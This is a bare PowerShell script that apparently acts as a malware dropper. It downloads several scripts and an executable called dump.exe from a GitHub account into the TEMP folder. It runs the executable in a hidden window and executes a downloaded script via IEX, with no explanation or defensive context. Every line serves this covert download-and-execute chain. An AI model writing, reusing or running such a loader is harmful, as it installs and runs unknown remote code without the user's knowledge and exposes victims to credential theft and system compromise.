$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/Scrip.ps1"
$output1 = "$env:TEMP\MyScript.ps1"
Invoke-WebRequest -Uri $url1 -OutFile $output1
$url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
$output5 = "$env:TEMP\dump.exe"
Invoke-WebRequest -Uri $url5 -OutFile $output5
Start-Process -FilePath $output5 -WindowStyle Hidden
$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
$output2 = "$env:TEMP\stop.ps1"
Invoke-WebRequest -Uri $url2 -OutFile $output2
$url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
$output3 = "$env:TEMP\BAT.ps1"
Invoke-WebRequest -Uri $url3 -OutFile $output3
IEX ((New-Object Net.WebClient).DownloadString($output3))

